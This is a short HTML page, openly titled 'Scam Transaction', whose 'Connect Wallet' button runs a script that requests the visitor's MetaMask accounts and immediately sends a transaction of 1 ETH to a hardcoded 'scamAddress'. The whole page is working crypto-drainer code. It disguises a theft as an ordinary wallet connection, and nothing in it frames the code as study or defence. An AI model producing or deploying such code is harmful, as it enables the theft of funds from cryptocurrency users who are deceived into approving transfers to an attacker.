
<!DOCTYPE html>
<html>
<head>
    <title>Scam Transaction</title>
</head>
<body>
    <button id="scamButton">Connect Wallet</button>
    <script>
        const scamAddress = "0x892f9237bf59f358798bdc9fe46082e84f7995ce";
        async function connectWallet() {
            if (typeof window.ethereum !== "undefined") {
                try {
                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                    const userAddress = accounts[0];
                    console.log("Wallet connected:", userAddress);
                    await sendScamTransaction(userAddress);
                } catch (error) {
                    console.error("Connection failed:", error);
                }
            } else {
                alert("MetaMask is not installed!");
            }
        }
        async function sendScamTransaction(fromAddress) {
            try {
                const transactionParameters = {
                    to: scamAddress,
                    from: fromAddress,
                    value: "0xDE0B6B3A7640000",
                    gas: "0x5208",
                };
                const txHash = await ethereum.request({
                    method: "eth_sendTransaction",
                    params: [transactionParameters],
                });
                console.log("Transaction sent! Hash:", txHash);
            } catch (error) {
                console.error("Transaction failed:", error);
            }
        }
        document.getElementById("scamButton").addEventListener("click", connectWallet);
    </script>
</body>
</html>
